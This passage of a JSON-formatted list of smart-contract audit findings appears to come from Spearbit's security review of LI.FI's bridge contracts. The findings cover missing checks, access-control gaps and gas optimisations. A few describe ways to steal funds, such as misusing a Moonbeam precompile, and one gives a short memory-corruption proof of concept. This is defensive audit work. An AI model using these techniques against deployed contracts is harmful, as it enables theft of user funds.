(lifiData.sendingAssetId != DAI) { revert InvalidSendingToken(); } gnosisBridgeData.amount = _executeAndCheckSwaps(lifiData, swapData, payable(msg.sender)); ... _startBridge(gnosisBridgeData); // sends DAI }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Funds transferred via Connext may be lost on destination due to incorrect receiver or calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "_startBridge() in AmarokFacet.sol and NXTPFacet.sol sets user-provided receiver and call data for the destination chain.  The receiver is intended to be LifiDiamond contract address on destination chain.  The call data is intended such that the functions completeBridgeTokensVia{Amarok/NXTP}() or swapAnd- CompleteBridgeTokensVia{Amarok/NXTP}() are called. In case of a frontend bug or a user error, these parameters can be malformed which will lead to stuck (and stolen) funds on destination chain. Since the addresses and functions are already known, the contract can instead pass this data to Connext instead of taking it from the user. 31", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Check output of swap is equal to amount bridged", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The result of swap (amount) isnt always checked to be the same as the bridged amount (_bridge- Data.amount). This way tokens could stay in the LiFi Diamond if more tokens are received with a swap than bridged. function swapAndStartBridgeTokensViaPolygonBridge(...) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); ... _startBridge(_lifiData, _bridgeData, true); } function _startBridge(..., BridgeData calldata _bridgeData, ...) ... { ... if (LibAsset.isNativeAsset(_bridgeData.assetId)) { rootChainManager.depositEtherFor{ value: _bridgeData.amount }(_bridgeData.receiver); } else { ... LibAsset.maxApproveERC20(IERC20(_bridgeData.assetId), _bridgeData.erc20Predicate, ,! _bridgeData.amount); bytes memory depositData = abi.encode(_bridgeData.amount); rootChainManager.depositFor(_bridgeData.receiver, _bridgeData.assetId, depositData); } ... }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Missing timelock logic on the DiamondCut facets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In LiFi Diamond, any facet address/function selector can be changed by the contract owner. Connext, Diamond should go through a proposal window with a delay of 7 days. In function diamondCut( FacetCut[] calldata _diamondCut, address _init, bytes calldata _calldata ) external override { LibDiamond.enforceIsContractOwner(); LibDiamond.diamondCut(_diamondCut, _init, _calldata); }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Data from emit LiFiTransferStarted() cant be relied on", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Most of the function do an emit like LiFiTransferStarted(). Some of the fields of the emits are (sometimes) verified, but most fields come from the input variable _lifiData. The problem with this is that anyone can do solidity transactions to the LiFi bridge and supply wrong data for the emit. For example: transfer a lot of Doge coins and in the emit say they are transferring wrapped BTC. Then the statistics would say a large amount of volume has been transferred, while in reality it is neglectable. The advantage of using a blockchain is that the data is (seen as) reliable. If the data isnt reliable, it isnt worth the trouble (gas cost) to store it in a blockchain and it could just be stored in an offline database. The result of this is, its not useful to create a subgraph on the emit data (because it is unreliable). This would mean a lot of extra work for subgraph builders to reverse engineer what is going on. Also any kickback fees to in- tegrators or referrers cannot be based on this data because it is unreliable. Also user interfaces & dashboards could display the wrong information. 33 function startBridgeTokensViaOmniBridge(LiFiData calldata _lifiData, ...) ... { ... LibAsset.depositAsset(_bridgeData.assetId, _bridgeData.amount); _startBridge(_lifiData, _bridgeData, _bridgeData.amount, false); } function _startBridge(LiFiData calldata _lifiData, ... ) ... { ... // do actions emit LiFiTransferStarted( _lifiData.transactionId, \"omni\", \"\", _lifiData.integrator, _lifiData.referrer, _lifiData.sendingAssetId, _lifiData.receivingAssetId, _lifiData.receiver, _lifiData.amount, _lifiData.destinationChainId, _hasSourceSwap, false ); }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Missing emit in XChainExecFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function swapAndCompleteBridgeTokens of Executor does do an emit LiFiTransferCom- pleted , while the comparable function in XChainExecFacet doesnt do this emit. This way there will be missing emits. contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function swapAndCompleteBridgeTokens(LiFiData calldata _lifiData, ... ) ... { ... emit LiFiTransferCompleted( ... ); } } contract XChainExecFacet is SwapperV2, ReentrancyGuard { function swapAndCompleteBridgeTokens(LiFiData calldata _lifiData, ... ) ... { ... // no emit } }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Different access control to withdraw funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "To withdraw any stuck tokens, WithdrawFacet.sol provides two functions: executeCallAndWith- draw() and withdraw(). Both have different access controls on them.  executeCallAndWithdraw() can be called by the owner or if msg.sender has been approved to call a function whose signature matches that of executeCallAndWithdraw().  withdraw() can only be called by the owner. If the function signature of executeCallAndWithdraw() clashes with an approved signature in execAccess map- ping, the approved address can steal all the funds in LifiDiamond contract.", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Use internal where possible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Several functions have an access control where the msg.sender if compared to address(this), which means it can only be called from the same contract. In the current code with the various generic call mechanisms this isnt a safe check. For example the function _execute() from Executor.sol can circumvent this check. Luckily the function where this has been used have a low risk profile so the risk of this issue is limited. function swapAndCompleteBridgeTokensViaStargate(...) ... { if (msg.sender != address(this)) { revert InvalidCaller(); } ... }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Event of transfer is not emitted in the AxelarFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The usage of the LiFi protocol depends largely to the off chain APIs. It takes all values, fees, limits, chain ids and addresses to be called from the APIs. The events are useful to record these changes on-chain for off-chain monitors/tools/interfaces when integrating with off-chain APIs. Although, other facets are emitting LiFiTransferStarted event, AxelarFacet does not emit this event. contract AxelarFacet { function executeCallViaAxelar(...) ... {} function executeCallWithTokenViaAxelar(...) ... {} } On the receiving side, the Executor contract does do an emit in function _execute() but not in function _- executeWithToken(). contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function _execute(...) ... { ... emit AxelarExecutionComplete(callTo, bytes4(callData)); } function _executeWithToken( ... // no emit } }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Improve checks on the facets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the facets, receiver/destination address and amount checks are missing.  The symbol parameter is used to get address of token with gateways tokenAddresses function. tokenAd- dresses function get token address by mapping. If the symbol does not exist, the token address can be zero. AxelarFacet and Executor do not check If the given symbol exists or not. 36 contract AxelarFacet { function executeCallWithTokenViaAxelar(...) ... { address tokenAddress = s.gateway.tokenAddresses(symbol); } function initAxelar(address _gateway, address _gasReceiver) external { s.gateway = IAxelarGateway(_gateway); s.gasReceiver = IAxelarGasService(_gasReceiver); } } contract Executor { function _executeWithToken(...) ... { address tokenAddress = s.gateway.tokenAddresses(symbol); } }  GnosisBridgeFacet, CBridgeFacet, HopFacet and HyphenFacets are missing receiver address/amount check. contract CBridgeFacet { function _startBridge(...) ... { ... _cBridgeData.receiver ... } } contract GnosisBridgeFacet { function _startBridge(...) ... { ... gnosisBridgeData.receiver ... } } contract HopFacet { function _startBridge(...) ... { _hopData.recipient, ... ... } } contract HyphenFacet { function _startBridge(...) ... { _hyphenData.recipient ... ... } }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Use keccak256() instead of hex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Several NAMESPACEs are defined, some with a hex value and some with a keccak256(). To be able to verify they are all different it is better to use the same format everywhere. If they would use the same value then the variables stored on that location could interfere with each other and the LiFi Diamond could start to behave unreliably. ... NAMESPACE = hex\"c7...\"; // keccak256(\"com.lifi.facets.axelar\") ... NAMESPACE = hex\"cf...\"; // keccak256(\"com.lifi.facets.ownership\"); ... NAMESPACE = hex\"a6...\"; ReentrancyGuard.sol: AxelarFacet.sol: OwnershipFacet.sol: PeripheryRegistryFacet.sol: ... NAMESPACE = hex\"dd...\"; // keccak256(\"com.lifi.facets.periphery_registry\"); ,! StargateFacet.sol: LibAccess.sol: ,! LibDiamond.sol: keccak256(\"com.lifi.library.access.management\") ... NAMESPACE = keccak256(\"com.lifi.facets.stargate\"); ... ACCESS_MANAGEMENT_POSITION = hex\"df...\"; // ... DIAMOND_STORAGE_POSITION = keccak256(\"diamond.standard.diamond.storage\");", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Remove redundant Swapper.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There are two versions of Swapper.sol (e.g Swapper.sol and SwapperV2.sol ) which are function- ally more or less the same. The WormholeFacet contract is the only one still using Swapper.sol. Having two versions of the same code is confusing and difficult to maintain. import { Swapper } from \"../Helpers/Swapper.sol\"; contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Use additional checks for transferFrom()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Several functions transfer tokens via transferFrom() without checking the return code. Some of the contracts are not covering edge cases like non-standard ERC20 tokens that do not:  revert on failed transfers.  Some ERC20 implementations dont revert is the balance is insufficient but return false. Other functions transfer tokens with checking if the amount of tokens received is equal to the amount of tokens requested. This relevant for tokens that withhold a fee. Luckily there is always additional code, like bridge, dex or pool code, that verifies the amount of tokens received, so the risk is limited. contract AxelarFacet { function executeCallWithTokenViaAxelar(... ) ... { ... IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount); // no check on return ,! code & amount of tokens ... } } contract ERC20Proxy is Ownable { function transferFrom(...) ... { ... IERC20(tokenAddress).transferFrom(from, to, amount); // no check on return code & amount of ,! tokens ... } } contract FusePoolZap { function zapIn(...) ... { ... IERC20(_supplyToken).transferFrom(msg.sender, address(this), _amount); // no check on amount of tokens ,! return code & } } library LibSwap { function swap(...) ... { ... LibAsset.transferFromERC20(fromAssetId, msg.sender, address(this), toDeposit); // no check on amount of tokens } ,! }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Move code to check amount of tokens transferred to library", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Facet.sol,OptimismBridgeFacet.sol, PolygonBridgeFacet.sol and StargateFacet.sol, to verify all required tokens are indeed transferred. The following piece of code is present However it doesnt check msg.value == _bridgeData.amount in case a native token is used. The more generic depositAsset() of LibAsset.sol does have this check. uint256 _fromTokenBalance = LibAsset.getOwnBalance(_bridgeData.assetId); LibAsset.transferFromERC20(_bridgeData.assetId, msg.sender, address(this), _bridgeData.amount); if (LibAsset.getOwnBalance(_bridgeData.assetId) - _fromTokenBalance != _bridgeData.amount) { revert InvalidAmount(); }", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Fuse pools are not whitelisted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Rari Fuse is a permissionless framework for creating and running user-created open interest rate pools with customizable parameters. On the FusePoolZap contract, the correctness of pool is not checked. Be- cause of Fuse is permissionless framework, an attacker can create a fake pool, through this contract a user can be be tricked in the malicious pool. function zapIn( address _pool, address _supplyToken, uint256 _amount ) external {}", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Missing two-step transfer ownership pattern", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Executor contract used for arbitrary cross-chain and same chain execution, swaps and transfers. The Executor contract uses Ownable from OpenZeppelin which is a simple mechanism to transfer the ownership not supporting a two-steps transfer ownership pattern. OpenZeppelin describes Ownable as: Ownable is a simpler mechanism with a single owner \"role\" that can be assigned to a single account. This simpler mechanism can be useful for quick tests but projects with production concerns are likely to outgrow it. Transferring ownership is a critical operation and transferring it to an inaccessible wallet or renouncing the owner- ship e.g. by mistake, can effectively lost functionality.", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Use low-level call only on contract addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the following case, if callTo is an EOA, success will be true. (bool success, ) = callTo.call(callData); The user intention here will be to do a smart contract call. So if there is no code deployed at callTo, the execution should be reverted. Otherwise, users can be under a wrong assumption that their cross-chain call was successful.", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Functions which do not expect ether should be non-payable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "A function which doesnt expect ether should not be marked payable. swapAndStartBridgeTo- kensViaAmarok() is a payable function, however it reverts when called for the native asset: if (_bridgeData.assetId == address(0)) { revert TokenAddressIsZero(); } So in the case where _bridgeData.assetId != address(0), any ether sent as msg.value is locked in the con- tract.", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Incompatible contract used in the WormholeFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the code review, It has been observed that all other faucets are using SwapperV2 contract. However, the WormholeFacet is still using Swapper contract. With the recent change on the SwapperV2, leftOvers can be send to specific receiver. With the using old contract, this capability will be lost in the related faucet. Also, LiFi Team claims that Swapper contract will be deprecated. ... import { Swapper } from \"../Helpers/Swapper.sol\"; /// @title Wormhole Facet /// @author [LI.FI](https://li.fi) /// @notice Provides functionality for bridging through Wormhole contract WormholeFacet is ILiFi, ReentrancyGuard, Swapper { ...", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Solidity version bump to latest", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the review the newest version of solidity was released with the important bug fixes & Bug.", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Bridge with AmarokFacet can fail due to hardcoded variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the code review, It has been observed that callbackFee and relayerFee are set to 0. However, Connext mentioned that Its set to 0 on the testnet. On the mainnet, these variables can be edited by Connext and AmarokFacet bridge operations can fail. ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, // fee paid to relayers; relayers don't take any fees on testnet relayerFee: 0, // fee paid to relayers; relayers don't take any fees on testnet slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ...", "labels": ["Spearbit", "LIFI", "Severity: Low Risk"]}, {"title": "Store _dexs[i] into a temp variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The DexManagerFacet can store _dexs[i] into a temporary variable to save some gas. function batchAddDex(address[] calldata _dexs) external { if (msg.sender != LibDiamond.contractOwner()) { LibAccess.enforceAccessControl(); } mapping(address => bool) storage dexAllowlist = appStorage.dexAllowlist; uint256 length = _dexs.length; for (uint256 i = 0; i < length; i++) { _checkAddress(_dexs[i]); if (dexAllowlist[_dexs[i]]) continue; dexAllowlist[_dexs[i]] = true; appStorage.dexs.push(_dexs[i]); emit DexAdded(_dexs[i]); } } 43", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Optimize array length in for loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In a for loop the length of an array can be put in a temporary variable to save some gas. This has been done already in several other locations in the code. function swapAndStartBridgeTokensViaStargate(...) ... { ... for (uint8 i = 0; i < _swapData.length; i++) { ... } ... }", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "StargateFacet can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "It might be cheaper to call getTokenFromPoolId in a constructor and store in immutable variables (especially because there are not that many pool, currently max 3 per chain pool-ids ) On the other hand, It requires an update of the facet when new pools are added though. function getTokenFromPoolId(address _router, uint256 _poolId) private view returns (address) { address factory = IStargateRouter(_router).factory(); address pool = IFactory(factory).getPool(_poolId); return IPool(pool).token(); } For the srcPoolId it would be possible to replace this with a token address in the calling interface and lookup the poolid. However, for dstPoolId this would be more difficult, unless you restrict it to the case where srcPoolId == dstPoolId e.g. the same asset is received on the destination chain. This seems a logical restriction. The advantage of not having to specify the poolids is that you abstract the interface from the caller and make the function calls more similar.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Use block.chainid for chain ID verification in HopFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "HopFacet.sol uses user provided _hopData.fromChainId to identify current chain ID. Call to Hop Bridge will revert if it does not match block.chain, so this is still secure. However, as a gas optimization, this parameter can be removed from HopData struct, and its usage can be replaced by block.chainid.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Rename event InvalidAmount(uint256) to ZeroAmount()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "event InvalidAmount(uint256) is emitted only with an argument of 0: if (_amount <= 0) { revert InvalidAmount(_amount); } ... if (msg.value <= 0) { revert InvalidAmount(msg.value); } Since amount and msg.value can only be non-negative, these if conditions succeed only when these values are 0. Hence, only InvalidAmount(0) is ever emitted.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Use custom errors instead of strings", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "To save some gas the use of custom errors leads to cheaper deploy time cost and run time cost. The run time cost is only relevant when the revert condition is met.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization LibDiamond.sol#L56,"]}, {"title": "Use calldata over memory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memory index. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution. If the array is passed to an internal function which passes the array to another internal function where the array is modified and therefore memory is used in the external call, its still more gass-efficient to use calldata when the external function uses modifiers, since the modifiers may prevent the internal functions from being called. Some gas savings if function arguments are passed as calldata instead of memory.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Avoid reading from storage when possible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Functions, which can only be called by the contracts owner, can use msg.sender to read owners In all these cases below, ownership check is already done, so it is address after the ownership check is done. guaranteed that owner == msg.sender. LibAsset.transferAsset(tokenAddress, payable(owner), balance); ... LibAsset.transferAsset(tokenAddresses[i], payable(owner), balance); ... if (_newOwner == owner) revert NewOwnerMustNotBeSelf(); owner is a state variable, so reading it has significant gas costs. This can be avoided here by using msg.sender instead.", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Increment for loop variable in an unchecked block", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "(This is only relevant if you are using the default solidity checked arithmetic). i++ involves checked arithmetic, which is not required. This is because the value of i is always strictly less than length <= 2**256 - 1. Therefore, the theoretical maximum value of i to enter the for-loop body is 2**256 - 2. This means that the i++ in the for loop can never overflow. Regardless, the overflow checks are performed by the compiler. Unfortunately, the Solidity optimizer is not smart enough to detect this and remove the checks. One can manually do this by: for (uint i = 0; i < length; ) { // do something that doesn't change the value of i unchecked { ++i; } }", "labels": ["Spearbit", "LIFI", "Severity: Gas Optimization"]}, {"title": "Executor should consider pre-deployed contract behaviors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Executor contract allows users to do arbitrary calls. This allows users to trigger pre-deployed contracts (which are used on specific chains). Since the behaviors of pre-deployed contracts differ, dapps on different evm compatible chain would have different security assumption. Please refer to the Avax bug fix. Native-asset-call-deprecation Were the native asset call not deprecated, exploiters can bypass the check and triggers ERC20Proxy through the pre-deployed contract. Since the Avalanche team has deprecated the dangerous pre-deployed, the current Executor contract is not vulnerable. Moonbeams pre-deployed contract also has strange behaviors. Precompiles erc20 allows users transfer native token through ERC20 interface. Users can steal native tokens on the Executor by setting callTo = address(802) and calldata = transfer(receiver, amount) One of the standard ethereum mainnet precompiles is \"Identity\" (0x4), which copies memory. Depending on the use of memory variables of the function that does the callTo, it can corrupt memory. Here is a POC: 47 pragma solidity ^0.8.17; import \"hardhat/console.sol\"; contract Identity { function CorruptMem() public { uint dest = 128; uint data = dest + 1 ; uint len = 4; assembly { if iszero(call(gas(), 0x04, 0, add(data, 0x20), len, add(dest,0x20), len)) { invalid() } } } constructor() { string memory a = \"Test!\"; CorruptMem(); console.log(string(a)); // --> est!! } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Documentation improvements", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There are a few issues in the documentation:  HyphenFacets documentation describes a function no longer present.  Link to DexManagerFacet in README.md is incorrect.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Check quoteTimestamp is within ten minutes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "quoteTimestamp is not validated. According to Across, quoteTimestamp variable, at which the depositor will be quoted for L1 liquidity. This enables the depositor to know the L1 fees before submitting their deposit. Must be within 10 mins of the current time. function _startBridge(AcrossData memory _acrossData) internal { bool isNative = _acrossData.token == ZERO_ADDRESS; if (isNative) _acrossData.token = _acrossData.weth; else LibAsset.maxApproveERC20(IERC20(_acrossData.token), _acrossData.spokePool, ,! _acrossData.amount); IAcrossSpokePool pool = IAcrossSpokePool(_acrossData.spokePool); pool.deposit{ value: isNative ? _acrossData.amount : 0 }( _acrossData.recipient, _acrossData.token, _acrossData.amount, _acrossData.destinationChainId, _acrossData.relayerFeePct, _acrossData.quoteTimestamp ); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Integrate two versions of depositAsset()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function depositAsset(, , isNative ) doesnt check tokenId == NATIVE_ASSETID, although depositAsset(,) does. In the code base depositAsset(, , isNative ) isnt used. function depositAsset( address tokenId, uint256 amount, bool isNative ) internal { if (amount == 0) revert InvalidAmount(); if (isNative) { ... } else { ... } } function depositAsset(address tokenId, uint256 amount) internal { return depositAsset(tokenId, amount, tokenId == NATIVE_ASSETID); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Simplify batchRemoveDex()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The code of batchRemoveDex() is somewhat difficult to understand and thus to maintain. function batchRemoveDex(address[] calldata _dexs) external { ... uint256 jlength = storageDexes.length; for (uint256 i = 0; i < ilength; i++) { ... for (uint256 j = 0; j < jlength; j++) { if (storageDexes[j] == _dexs[i]) { ... // update storageDexes.length; jlength = storageDexes.length; break; } } } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Error handing in executeCallAndWithdraw", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "If isContract happens to be false then success is false (as it is initialized as false and not updated) Thus the _withdrawAsset() will never happen. Function withdraw() also exist so this functionality isnt necessary but its more logical to revert earlier. 50 function executeCallAndWithdraw(...) ... { ... bool success; bool isContract = LibAsset.isContract(_callTo); if (isContract) { false // thus is false ,! (success, ) = _callTo.call(_callData); } if (success) { // if this is false, then success stays _withdrawAsset(_assetAddress, _to, _amount); // this never happens if isContract == false } else { revert WithdrawFailed(); } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "_withdrawAsset() could use LibAsset.transferAsset()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "A large part of the function _withdrawAsset() is very similar to LibAsset.transferAsset(). function _withdrawAsset(...) ... { ... if (_assetAddress == NATIVE_ASSET) { address self = address(this); if (_amount > self.balance) revert NotEnoughBalance(_amount, self.balance); (bool success, ) = payable(sendTo).call{ value: _amount }(\"\"); if (!success) revert WithdrawFailed(); } else { assetBalance = IERC20(_assetAddress).balanceOf(address(this)); if (_amount > assetBalance) revert NotEnoughBalance(_amount, assetBalance); SafeERC20.safeTransfer(IERC20(_assetAddress), sendTo, _amount); } ... }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "anySwapOut() doesnt lower allowance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function anySwapOut() only seems to work with Anyswap tokens. It burns the received to- kens here: AnyswapV5Router.sol#L334 This burning doesnt use/lower the allowance, so the allowance will stay present. Also see howto: function anySwapOut ==> no need to approve. function _startBridge(...) ... { ... LibAsset.maxApproveERC20(IERC20(underlyingToken), _anyswapData.router, _anyswapData.amount); ... IAnyswapRouter(_anyswapData.router).anySwapOut(...); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Anyswap rebrand", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Anyswap is rebranded to Multichain see rebrand.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Check processing of native tokens in AnyswapFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The variable isNative seems to mean a wrapped native token is used (see function _getUnderly- ingToken() ). Currently startBridgeTokensViaAnyswap() skips LibAsset.depositAsset() when isNative == true, but a wrapped native tokens should also be moved via LibAsset.depositAsset(). Also _startBridge() tries to send native tokens with { value: _anyswapData.amount } then isNative == true, but this wouldnt work with wrapped tokens. The Howto seems to indicate an approval (of the wrapped native token) is neccesary. 52 contract AnyswapFacet is ILiFi, SwapperV2, ReentrancyGuard { ,! ,! function startBridgeTokensViaAnyswap(LiFiData calldata _lifiData, AnyswapData calldata _anyswapData) ... { { // Multichain (formerly Anyswap) tokens can wrap other tokens (address underlyingToken, bool isNative) = _getUnderlyingToken(_anyswapData.token, _anyswapData.router); if (!isNative) LibAsset.depositAsset(underlyingToken, _anyswapData.amount); ... } function _getUnderlyingToken(address token, address router) ... { ... if (token == address(0)) revert TokenAddressIsZero(); underlyingToken = IAnyswapToken(token).underlying(); // The native token does not use the standard null address ID isNative = IAnyswapRouter(router).wNATIVE() == underlyingToken; // Some Multichain complying tokens may wrap nothing if (!isNative && underlyingToken == address(0)) { underlyingToken = token; } } function _startBridge(... ) ... { ... if (isNative) { IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }(...); // ,! send native tokens } ... } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Remove payable in swapAndCompleteBridgeTokensViaStargate()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There are 2 versions of sgReceive() / completeBridgeTokensViaStargate() which use different locations for nonReentrant The function swapAndCompleteBridgeTokensViaStargate of Executor is payable but doesnt receive native to- kens. 53 contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function sgReceive(...) external { // not payable ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, payable(receiver)); // ,! doesn't send native assets ... } function swapAndCompleteBridgeTokensViaStargate(...) external payable nonReentrant { // is payable if (msg.sender != address(this)) { revert InvalidCaller(); } } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Use the same order for inherited contracts.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The inheritance of contract isnt always done in the same order. For code consistency its best to always put them in the same order. contract AmarokFacet contract AnyswapFacet contract ArbitrumBridgeFacet contract CBridgeFacet contract GenericSwapFacet contract GnosisBridgeFacet contract HopFacet contract HyphenFacet contract NXTPFacet contract OmniBridgeFacet contract OptimismBridgeFacet contract PolygonBridgeFacet contract StargateFacet contract GenericBridgeFacet contract WormholeFacet contract AcrossFacet contract Executor is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is 